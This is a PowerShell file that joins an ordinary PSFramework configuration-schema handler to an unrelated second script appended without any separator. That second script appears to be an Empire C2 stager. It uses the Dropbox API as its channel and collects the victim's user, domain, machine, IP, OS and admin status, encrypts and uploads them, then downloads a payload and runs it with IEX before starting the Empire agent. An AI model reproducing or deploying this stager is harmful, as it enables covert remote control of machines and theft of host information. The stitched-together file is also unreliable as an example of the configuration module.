Register-PSFConfigSchema -Name MetaJson -Schema {
	param (
		[string]
		$Resource,
		
		[System.Collections.Hashtable]
		$Settings
	)
	
	Write-PSFMessage -String 'Configuration.Schema.MetaJson.ProcessResource' -StringValues $Resource -ModuleName PSFramework
	
	
	$Peek = $Settings["Peek"]
	$ExcludeFilter = $Settings["ExcludeFilter"]
	$IncludeFilter = $Settings["IncludeFilter"]
	$AllowDelete = $Settings["AllowDelete"]
	$script:EnableException = $Settings["EnableException"]
	$script:cmdlet = $Settings["Cmdlet"]
	Set-Location -Path $Settings["Path"]
	$PassThru = $Settings["PassThru"]
	
	
	
	function Read-V1Node
	{
		[CmdletBinding()]
		param (
			$NodeData,
			
			[string]
			$Path,
			
			[Hashtable]
			$Result
		)
		
		Write-PSFMessage -String 'Configuration.Schema.MetaJson.ProcessFile' -StringValues $Path -ModuleName PSFramework
		
		$basePath = Split-Path -Path $Path
		if ($NodeData.ModuleName) { $moduleName = "{0}." -f $NodeData.ModuleName }
		else { $moduleName = "" }
		
		
		foreach ($property in $NodeData.Static.PSObject.Properties)
		{
			$Result["$($moduleName)$($property.Name)"] = $property.Value
		}
		foreach ($property in $NodeData.Object.PSObject.Properties)
		{
			$Result["$($moduleName)$($property.Name)"] = $property.Value | ConvertFrom-PSFClixml
		}
		foreach ($property in $NodeData.Dynamic.PSObject.Properties)
		{
			$Result["$($moduleName)$(Resolve-V1String -String $property.Name)"] = Resolve-V1String -String $property.Value
		}
		
		
		
		foreach ($include in $NodeData.Include)
		{
			$resolvedInclude = Resolve-V1String -String $include
			$uri = [uri]$resolvedInclude
			if ($uri.IsAbsoluteUri)
			{
				try
				{
					$newData = Get-Content $resolvedInclude -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
				}
				catch { Stop-PSFFunction -String 'Configuration.Schema.MetaJson.InvalidJson' -StringValues $resolvedInclude -EnableException $script:EnableException -ModuleName PSFramework -ErrorRecord $_ -Continue -Cmdlet $script:cmdlet }
				try
				{
					$null = Read-V1Node -NodeData $newData -Result $Result -Path $resolvedInclude
					continue
				}
				catch { Stop-PSFFunction -String 'Configuration.Schema.MetaJson.NestedError' -StringValues $resolvedInclude -EnableException $script:EnableException -ModuleName PSFramework -ErrorRecord $_ -Continue -Cmdlet $script:cmdlet }
			}
			
			$joinedPath = Join-Path -Path $basePath -ChildPath ($resolvedInclude -replace '^\.\\', '\')
			try { $resolvedIncludeNew = Resolve-PSFPath -Path $joinedPath -Provider FileSystem -SingleItem }
			catch { Stop-PSFFunction -String 'Configuration.Schema.MetaJson.ResolveFile' -StringValues $joinedPath -EnableException $script:EnableException -ModuleName PSFramework -ErrorRecord $_ -Continue -Cmdlet $script:cmdlet }
			
			try
			{
				$newData = Get-Content $resolvedIncludeNew -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
			}
			catch { Stop-PSFFunction -String 'Configuration.Schema.MetaJson.InvalidJson' -StringValues $resolvedIncludeNew -EnableException $script:EnableException -ModuleName PSFramework -ErrorRecord $_ -Continue -Cmdlet $script:cmdlet }
			try
			{
				$null = Read-V1Node -NodeData $newData -Result $Result -Path $resolvedIncludeNew
				continue
			}
			catch { Stop-PSFFunction -String 'Configuration.Schema.MetaJson.NestedError' -StringValues $resolvedIncludeNew -EnableException $script:EnableException -ModuleName PSFramework -ErrorRecord $_ -Continue -Cmdlet $script:cmdlet }
		}
		
		
		$Result
	}
	
	function Resolve-V1String
	{
	
		[CmdletBinding()]
		param (
			$String
		)
		if ($String -isnot [string]) { return $String }
		
		$scriptblock = {
			param (
				$Match
			)
			
			$script:envData[$Match.Value]
		}
		
		[regex]::Replace($String, $script:envDataNamesRGX, $scriptblock)
	}
	
	
	
	$script:envData = @{ }
	foreach ($envItem in (Get-ChildItem env:\))
	{
		$script:envData["%$($envItem.Name)%"] = $envItem.Value
	}
	$script:envDataNamesRGX = $script:envData.Keys -join '|'
	
	
	
	try { $resolvedPath = Resolve-PSFPath -Path $Resource -Provider FileSystem -SingleItem }
	catch
	{
		Stop-PSFFunction -String 'Configuration.Schema.MetaJson.ResolveFile' -StringValues $Resource -ModuleName PSFramework -FunctionName 'Schema: MetaJson' -EnableException $EnableException -ErrorRecord $_ -Cmdlet $script:cmdlet
		return
	}
	
	try { $importData = Get-Content -Path $resolvedPath -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop }
	catch
	{
		Stop-PSFFunction -String 'Configuration.Schema.MetaJson.InvalidJson' -StringValues $Resource -ModuleName PSFramework -FunctionName 'Schema: MetaJson' -EnableException $EnableException -ErrorRecord $_ -Cmdlet $script:cmdlet
		return
	}
	
	
	switch ($importData.Version)
	{
		1
		{
			$configurationHash = Read-V1Node -NodeData $importData -Path $resolvedPath -Result @{ }
			$configurationItems = $configurationHash.Keys | ForEach-Object {
				[pscustomobject]@{
					FullName = $_
					Value = $configurationHash[$_]
				}
			}
			
			foreach ($configItem in $configurationItems)
			{
				if ($ExcludeFilter | Where-Object { $configItem.FullName -like $_ }) { continue }
				if ($IncludeFilter -and -not ($IncludeFilter | Where-Object { $configItem.FullName -like $_ })) { continue }
				if ($Peek)
				{
					$configItem
					continue
				}
				
				Set-PSFConfig -FullName $configItem.FullName -Value $configItem.Value -AllowDelete:$AllowDelete -PassThru:$PassThru
			}
		}
		default
		{
			Stop-PSFFunction -String 'Configuration.Schema.MetaJson.UnknownVersion' -StringValues $Resource, $importData.Version -ModuleName PSFramework -FunctionName 'Schema: MetaJson' -EnableException $EnableException -Cmdlet $script:cmdlet
			return
		}
	}
}function Start-Negotiate {
    param($T,$SK,$PI=5,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            
            $IV = $In[0..15];
            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;

    $SKB=$e.GetBytes($SK);
    
    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    $rk=$rs.ToXmlString($False);

    
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);

    
    $ib=$e.getbytes($rk);

    
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    
    
    if(-not $wc) {
        $wc=New-Object System.Net.WebClient;
        
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }

    if ($Script:Proxy) {
        $wc.Proxy = $Script:Proxy;   
    }
    
    
    
    
    
    
    
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    
    $wc.Headers.Set("User-Agent",$UA);
    
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Content-Type", "application/octet-stream");
    
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_1.txt`"}");
    
    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p);

    
    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set("User-Agent",$UA);
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_2.txt`"}");
    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
    $de=$e.GetString($rs.decrypt($raw,$false));
    
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    
    $nonce=[String]([long]$nonce + 1);

    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    
    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;

    
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    
    
    
    
    
    
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    
    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set("User-Agent",$UA);
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Content-Type", "application/octet-stream");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_3.txt`"}");

    
    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p2);

    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set("User-Agent",$UA);
    $wc.Headers.Set("Authorization", "Bearer $T");
    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");
    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");

    Start-Sleep -Seconds $($PI -as [Int]);
    $wc2=New-Object System.Net.WebClient;
    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    if($Script:Proxy) {
        $wc2.Proxy = $Script:Proxy;
    }
    
    $wc2.Headers.Add("User-Agent",$UA);
    $wc2.Headers.Add("Authorization", "Bearer $T");
    $wc2.Headers.Add("Content-Type", " application/json");
    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");

    
    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );

    
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    
    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -ProxySettings $Script:Proxy;
}

Start-Negotiate -T $T -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
